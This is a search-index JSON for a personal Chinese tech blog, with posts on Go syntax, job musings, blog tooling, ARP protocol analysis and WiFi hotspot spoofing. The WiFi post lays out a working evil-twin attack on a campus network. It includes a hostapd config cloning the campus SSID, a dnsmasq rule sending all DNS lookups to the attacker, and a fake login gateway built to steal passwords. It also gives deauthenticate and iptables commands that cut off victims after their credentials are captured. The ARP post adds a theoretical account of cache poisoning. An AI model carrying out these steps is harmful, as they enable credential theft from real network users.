{"pages":[{"text":"简历 (English versoin)","tags":"pages","loc":"/about.html","title":"About"},{"text":"Go 语法差异 Variables and Constant package main var s string = \"initial\" func main () { var a , b int = 1 , 2 const n = 5000000 f := float64 ( 3.3 ) } For Loop // classic initial/condition/after for loop for j := 7 ; j <= 9 ; j ++ { fmt . Println ( j ) } // most basic for loop i := 1 for i <= 3 { fmt . Println ( i ) i = i + 1 } // infinite loop for { fmt . Println ( \"loop\" ) } If/Else Switch // use commas to separate multiple expression in the same case statement switch time . Now (). Weekday () { case time . Saturday , time . Sunday : fmt . Println ( \"it's the weekend\" ) default : fmt . Println ( \"it's a weekday\" ) } // alternate way to implement If/Else while without an expression t := time . Now () switch { case t . Hour () < 12 : fmt . Println ( \"it's before noon\" ) default : fmt . Println ( \"it's after noon\" ) } Array, Slices, Maps var a [ 5 ] int s := make ([] string , 3 ) m := make ( map [ string ] int ) Functions Do NOT support nested functions, function overload, function default parameter multiple return values go func vals() (int, int) { return 3, 7 } func main() { a, b = vals() _, b = vals() } variadic function go func sum(nums ...int) { fmt.Printlf(nums) } func main() { sum(1, 2, 3) nums := []int{1, 2, 3, 4} sum(nums...) } Clousure Go supports anonymous functions, which can form closures. Defer ```go package main import \"fmt\" func main() { defer fmt.Println(\"世界\") fmt.Println('Hello') } Deferred function calls are pushed onto a stack. When a function returns, its deferred calls are executed in last-in-first-out order. - Panic go package main import \"fmt\" func test() { defer func() { if err := recover(); err != nil { fmt.Println(err.(string)) } }() panic(\"panic errors\") } func main() { test() } ``` - Errors - Pointers, Structs, Methods, Interface // _Interfaces_ are named collections of method // signatures. package main import \"fmt\" import \"math\" // Here's a basic interface for geometric shapes. type geometry interface { area () float64 perim () float64 } // For our example we'll implement this interface on // `rect` and `circle` types. type rect struct { width , height float64 } type circle struct { radius float64 } // To implement an interface in Go, we just need to // implement all the methods in the interface. Here we // implement `geometry` on `rect`s. func ( r rect ) area () float64 { return r . width * r . height } func ( r rect ) perim () float64 { return 2 * r . width + 2 * r . height } // The implementation for `circle`s. func ( c circle ) area () float64 { return math . Pi * c . radius * c . radius } func ( c circle ) perim () float64 { return 2 * math . Pi * c . radius } // If a variable has an interface type, then we can call // methods that are in the named interface. Here's a // generic `measure` function taking advantage of this // to work on any `geometry`. func measure ( g geometry ) { fmt . Println ( g ) fmt . Println ( g . area ()) fmt . Println ( g . perim ()) } func main () { r := rect { width : 3 , height : 4 } c := circle { radius : 5 } // The `circle` and `rect` struct types both // implement the `geometry` interface so we can use // instances of // these structs as arguments to `measure`. measure ( r ) measure ( c ) } Reflect 多线程处理 Goroutines A goroutine is a lightweight thread of execution. ```go package main import \"fmt\" func f(from string) { for i := 0; i < 3; i++ { fmt.Println(from, \":\", i) } func main() { go f(\"args\") go func(msg string) { fmt.Println(msg) }(\"going\") var input string fmt.Scanln(&input) fmt.Println(\"done\") } ``` - Channels Channels are the pipes that connect concurrent goroutines. You can send values into channels from one goroutine and receive those values into another goroutine. ```go package main import \"fmt\" func main() { messages := make(chan string) go func() { messages <- \"ping\" }() msg := <-messages fmt.Println(msg) } ``` - Channel Buffering ` messages := make(chan string, 2)` - Channel Direction `func pong(pings <-chan string, pongs chan<- string) {}` - Closing Channel `close(channel)` Closing channel means there is no more values to be sent , it is possible to close a non - empty channel - Range over channels Range can not only provide iteration over basic data structure , but also iterate over values received from a channel. `` `go queue := make ( chan string , 2 ) queue <- \"one\" queue <- \"two\" close ( queue ) for elem := range queue { fmt.Println ( elem ) } `` ` Select // Go's _select_ lets you wait on multiple channel // operations. Combining goroutines and channels with // select is a powerful feature of Go. package main import \"time\" import \"fmt\" func main () { // For our example we'll select across two channels. c1 := make ( chan string ) c2 := make ( chan string ) // Each channel will receive a value after some amount // of time, to simulate e.g. blocking RPC operations // executing in concurrent goroutines. go func () { time . Sleep ( time . Second * 1 ) c1 <- \"one\" }() go func () { time . Sleep ( time . Second * 2 ) c2 <- \"two\" }() // We'll use `select` to await both of these values // simultaneously, printing each one as it arrives. for i := 0 ; i < 2 ; i ++ { select { case msg1 := <- c1 : fmt . Println ( \"received\" , msg1 ) case msg2 := <- c2 : fmt . Println ( \"received\" , msg2 ) } } } 包管理 Go 语言中 import 语句使用绝对路径的方式引入安装到本地的包。 使用 go get 命令安装远程仓库中托管的包 Go 语言还提供了一个 Workspace 的机制。通过设定 GOPATH环境变量，指定除了GOROOT所指定的目录之外，Go 代码所在的位置 (也就是 Workspace 的位置)。 一般来说，GOPATH目录下会包含pkg、src和bin三个子目录，这三个目录各有用处。 bin 目录用来放置编译好的可执行文件，为了使得这里的可执行文件可以方便的运行， 在 shell 中设置PATH变量。 pkg 目录用来放置代码源文件，在进行import时，是使用这个位置作为根目录的。自己编写的代码也应该放在这下面。 src 用来放置安装的包的链接对象 (Object) 的。这个概念有点类似于链接库，Go 会将编译出的可连接库放在这里， 方便编译时链接。不同的系统和处理器架构的对象会在pkg存放在不同的文件夹中。 ├── bin │ └── hello ├── pkg │ └── darwin_amd64 │ └── github.com │ └── user │ └── stringutil.a └── src └── github.com └── user ├── hello │ ├── hello │ └── hello.go └── stringutil └── reverse.go 进阶 Memory Allocator Garbage Collector Goroutine Scheduler Channel 参考资料 A Tour of Go Go By Example How to Write Go Code go 编程基础（视频） Go学习笔记 -- 雨痕 Go 语言的包依赖管理","tags":"Golang","loc":"/golang/2015/first-glance-at-go.html","title":"Golang"},{"text":"每次都不知道怎么开头。。 来了CC两个多礼拜吧，什么事情也没有做其实，无非是每天看看文档，帮头儿做下技术调研。刚才机器挂掉了，所以顺便出来坐坐 一般终面的时候面试官都会问你一个问题，你理想中的公司或者工作是什么样子的？是个好问题，但是当时却不一定能够回答得好。 现在正是个好时机想想这个问题。 首先，理想中的工作一定不是每天10+个小时对着电脑，要么做一些用脚后跟都能处理的事情，要么就是四指来回滑动切换画面无聊度日。现在遇到的技术性问题大多都可以通过 Google 解决，并且问题深度不够。技术方面的成长纯粹通过点滴积累得到的。这种工作没有个性而言，换做谁做都不会有什么变化。再者评价一个人能力纯粹根据他掌握的知识判断，自身的能力其实差别并不是很重要。说的再明白一点，丰富的技术经历技术积累一定会使你成为某一个领域的大牛，至少大多数人看来如此。但这并不妨碍一些人（往往他们比较挑剔并且很有品味)看不起你。 这就是我说的第二点。你的工作还需要灵魂的提高。大多数同行业的人对码农的评价基本上都是技术牛，没品位，能赚钱，不会花。其实我说的并不是很到位，甚至只是个人片面看法。我没有接触过更厉害的码农，这也是导致我的思维狭隘的一个原因。一个人的工作如果能让他变得不同于其他人，那么这份工作就是我的这个层次上的需求。随之而来的问题就是人是群居动物，如果你明显的鹤立鸡群的话你也许会越来越孤独。当然这又是另一个话题了。 再有一个无关于工作的因素，一个人的烦恼大部分因为理想远高于能力。恰恰这个东西又是非常不容易评判的。有一个词叫做潜力，当你明明知道自己的能力达不到自己的梦想的时候就会用这个词来搪塞，而且效果奇佳。人很难看清楚自己，别人容易看清楚自己是因为他们对你漠不关心！ 好了，是时候描述一下我心目中理想的工作是什么样子了。 一间很有味道的屋子，跟一些完全不是一个成长体系（说人话，专业迥异）的人共同做一件有意思的事情。这个事情没有必要描述的很清楚，总之是在做一件有意思的事情。 好吧我说不出来了，我想自己的思维已经被禁锢了，被和我一样想法的人禁锢了。因为我想要的生活一定是由一群苦逼的人们撑起来的。 每次写东西都不尽兴，写的不知所云。我也不知道美好的生活什么样子的，我只知道我周围的人没有一个过着我的生活。","tags":"琐碎","loc":"/suo-sui/2015/What-do-you-really-want.html","title":"你到底想要一个什么的工作"},{"text":"很久以前看过一篇关于WIFI脆弱性的 介绍 (找了好久终于被我找到了)，其中有一部分讲的是由于本身协议的弱点，相同 ssid 的热点会被合并为同一个，至于用户最终连接哪个热点取决于他所能接收到的信号强度。不知道此刻各位看官脑洞有没有大开？ 俗话说杀生不如宰熟，所以直接就向学校 ap 下手了。提前声明几个全局变量： ssid : NICESHOT os ： ubuntu 简单部署 用 hostapd 建立热点 \" hostapd is a user space daemon for access point and authentication servers. \" sudo apt-get install hostapd 更改配置文件 /etc/hostapd-hotspot.conf 如下： # WiFi Hotspot interface=wlan0 driver=nl80211 #Access Point ssid=NICESHOT hw_mode=g # WiFi Channel: channel=1 #macaddr_acl=0 auth_algs=1 wmm_enabled=0 #ignore_broadcast_ssid=0 #wpa=3 #wpa_passphrase=1 #wpa_key_mgmt=WPA-PSK #wpa_pairwise=TKIP #rsn_pairwise=CCMP ctrl_interface=/var/run/hostapd 可能还需要更改 /etc/default/hostapd 为 DAEMON_CONF=/etc/hostapd/hostapd.conf 然后测试配置文件 hostapd -d /etc/hostapd-hotspot.conf , 没有什么问题的话就可以启动服务了 service hostapd start 微型 DNCP & DNS -- dnsmasq Dnsmasq is a free software DNS forwarder and DHCP server for small networks. It is considered to be easily configured, with low system resource usage. sudo apt-get install dnsmasq 更改配置文件 /etc/dnsmasq.conf log-facility=/var/log/dnsmasq.log address=/#/192.168.1.1 interface=wlan0 dhcp-range=192.168.1.20,192.168.1.254,12h no-resolv 然后比较关键的是配置 wlan0 IP 地址 ifconfig wlan0 192.168.1.1 。 稍微总结一下，到此为止，我们做了这么些事情：创建 WFIFI 热点，监听 wlan0 口，然后通过配置DHCP给所有连接到此 AP 的终端分配IP地址。另外上面的这条配置 address=/#/192.168.1.1 ，将所有地址解析到我们的电脑 IP。 搭建服务器 此处就不详说了，最终达到的效果是访问 192.168.1.1 是我们的钓鱼网站。 因为校园网需要登陆，也就是说连接校园 AP 之后将所有 HTTP 页面跳转到网关登陆界面。所以我们也部署一个一模一样的登陆网关，然后所有连接的用户跟往常一样登陆网关，神不知鬼不觉得就把账号密码泄露过来了。稍后我会分享此处的简单代码 DEMO 到 GitHub。 进阶 当然不能停止在这么简陋的东西上面，我们需要更进一步。 粗暴的强制下线 毕竟我们只有一个无线网卡，用作 AP 之后就不能接入其他网络了，环境也不允许拉一根网线，用户登录网关之后根本没办法继续上网，很快你的伪 AP 就会被发现。所以我们强制所有登录网关，也就是被我们窃取密码的用户离线。 hostapd_cli deauthenticate 38:bc:1a:88:12:61 iptables -A INPUT -m mac --mac-source 38:bc:1a:88:12:61 -j DROP 第一句强制用户离线，之前在配置 hostapd 的时，这句就是为了达到这个目的 ctrl_interface=/var/run/hostapd ，第二句将所有该设备的请求丢弃。这就是当一个人丧失所有利用价值之后的下场！ 配置更为合理的 iptables（还没有实现） 当然，前提是我们自己的电脑还可以通过其他口，比如 eth0 ，访问正常网络。 通过配置合理强大的 iptables ,精心布局，我们不仅仅获取网关密码这么简单的并且还需要特别严格苛刻的场景的蛋糕。拭目以待。。。 思考 后记 伤敌一百，自损三千 因为自己的装备跟技术很挫，在配置之前那些东西的时候碰到了一些问题，险些出师未捷身先死。 在 ubuntu 下， service networking restart ,然后你就各种问题爽翻天 - 现在，至少目前为止插上网线之后还需要 ifup eth0 才能通过有线上网 - 现在，至少目前为止我连接 WIFI 的时候需要这么做（运气好的话差不多能连接上） ifup wlan0 #up the wlan port iwlist wlan0 scan #list availabel wifi ssid iwconfig wlan0 essid \"NICESHOT\" #no password iwconfig wlan0 ssid \"NICESHOT\" key password #with password dhcpclient wlan0 #get ip via dhcp 电脑里面出现了奇怪的端口:wlan0:avahi 系统自带的 network-manager 罢工了 其他未知错误待续","tags":"web","loc":"/web/2014/real-attack-show-wifi-vulnerability.html","title":"WIFI 热点欺骗"},{"text":"逛了一圈论坛博客神马的发现好多人也都在写点东西纪念今天 距离上一次写东西已经很久了，主要原因是因为Air跪了！幸灾乐祸的主儿可以去看看 原微 ，那可是目前自己微博上最火的一个 应该说这是之前那篇文章的续吧，可惜那篇的_Markdown_格式的已经弄没了，附上 链接 （估计也是唯一一个入口了）。当初心血来潮，也不完全心血来潮，算是小时候一个梦想吧，搞了这么一个极有技术含量的博客。现在看看当时还在初学者水平，只是简单的按照别人的教程做了下来。因为本儿跪了之后源代码也一并去了，所以一直都没有再更新，这一次重建博客，在之前的基础上新增加了很多东西， Travis 就是一个牛逼了的东西，待会儿我会接着把这一次的技术性细节一并简单介绍。 技术细节 Travis CI Travis CI is a hosted continuous integration service. Travis CI's build environment provides different runtimes for different languages, for instance multiple versions of Ruby, PHP, Node.js. It also comes preinstalled with a variety of data stores and common tools like message brokers. 使用 Pelican 的常规思路是在本地写好 md 或者其他格式的文件，然后 make publish ，当然这是集成命令，分解开就是先生成静态页面然后PUSH到 Git page 。看着似乎很简单，这是建立在首先配置好你的本地环境的基础上，并且每次换一台机器之后你都需要重新配置你的环境。配环境这事儿我只能呵呵了，那么多的的平台配法儿都不太一样。 但是，当你遇到 Travis CI 一切就都不一样了。你只要一次性配置完成，将你的source文件PUSH到某一个github仓库。之后的事情就容易多了，按最坏的情况来说，你的本撒手人寰了（哭瞎），你写了一篇文章纪念。以最快的速度把舍友的本儿扯过来. git clone git://github.com/username/bri.github.io-source mv remember.md path/to/content/ git add * git commit -m \"love you forever\" git push Done! 你的本儿在天之灵，看到以后应该就会安息了。 废话不说了，按照 Zonca 的 教程 一步一步下来基本没有错误，但是当时我走了很多弯路，自作聪明的改了一些脚本。如果遇到什么问题欢迎讨论。 Tipue Tipue Search is a site search engine jQuery plugin. It's free, open source and responsive. 还是跟上面一样，按照 Moparx 的 教程 走吧。 还有很多其他插件，像_Sitemap_什么的，之所以单独把这个列在这儿是因为发现原来静态页面也是可以交互的，它提供了一个思路。简单说就是将所有的网站页面存储到一个_JSON_文件，然后在搜索页面直接加载这个文件在本地搜索,非常快速。 Google Comments 之前用的是 Disqus ,但是总感觉不是很舒服，这儿有一个简单的 教程 都说是纪念了 高大上的 APEC 假期马上就结束了，按照大四之前的性子，至少半个月前已经在他乡了，异国不敢说，但是已经开始筹划了，护照就是第一步。六天的假期在我这儿怎么也得有半个月。最近却怂怂的呆在学校哪儿也不敢去。 反正就是没有找到工作。 好的工作 应该是什么样子的，我想了很多遍，从最开始投的第一家说起吧。 阿里巴巴，以网上笔试结果 诚信第一 终结了我。当时第一次参加网上笔试，幸灾乐祸的跟队友共同战斗以望能够从人海中脱颖而出。至于诚信什么的以后再说吧，大学之后关于这个的定义改变了很多。百度两次笔试无果，腾讯没有投递。BAT梦石沉大海，系统关照我有选择困难症。这之前我一直以为找份BAT的工作很容易，这之后我才去想一些事情。 。。。。。。 算了先就不无病呻吟了，刚才接到 知道创宇 HR的电话，在这么一个特殊的节日去面试。 最后附图纪念 1111","tags":"琐碎","loc":"/suo-sui/2014/build-and-remember-continued.html","title":"建站续，附乱七八糟"},{"text":"ARP 协议分析 @[arp|wireshark] 地址解析协议 ，即 ARP （Address Resolution Protocol） 是根据IP地址获取物理地址的一个TCP/IP协议。 工作过程 协议实战分析 安全威胁分析 工作流程 主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01； 主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02； 当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程： 1. 根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。 2. 如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。 3. 主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。 4. 主机B将包含其MAC地址的ARP回复消息直接发送回主机A。 5. 当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了 协议实战分析 测试环境：windows 测试工具: cmd, wireshark 在 cmd 中获取网关ip：10.3.17.1 配置 wireshap 截取来自网关，即10.3.17.1的arp包，设置如下 获取到arp包后停止，见下图 随机选择一个arp包（最后一个）进行分析 arp包明确定义了Hardware type,Protocol type,Hardware size,Protocol size,Sender Mac and IP address,Target Mac and IP address(从上面翻译后的内容可以清晰的看到)。 ARP缓存会持续一段时间（一般为2分钟），之后又进行新一轮的更新。 安全威胁分析 （因为模拟ARP攻击可能导致局域网内部出错，故此处只做理论分析） ARP欺骗 ARP请求为广播形式发送的，网络上的主机可以自主发送ARP应答消息，并且当其他主机收到应答报文时不会检测该报文的真实性就将其记录在本地的MAC地址转换表，这样攻击者就可以向目标主机发送伪ARP应答报文，从而篡改本地的MAC地址表。 ARP欺骗可以导致目标计算机与网关通信失败，更会导致通信重定向，所有的数据都会通过攻击者的机器。 最简单的攻击方式就是发送固定格式的ARP报文，类似于下面的格式： 已知被攻击者的ip以及mac地址（如果不知道可直接使用广播地址 FF.FF.FF.FF ），将其自己的mac地址以及想截获的目标地址IP封装好发送，即能够刷新被欺骗主机的ARP缓存，从而得到本该发往另一个IP的所有包 ARP cache poisoning","tags":"Web","loc":"/web/2011/ARP-protocol.html","title":"ARP protocol analysis"}]}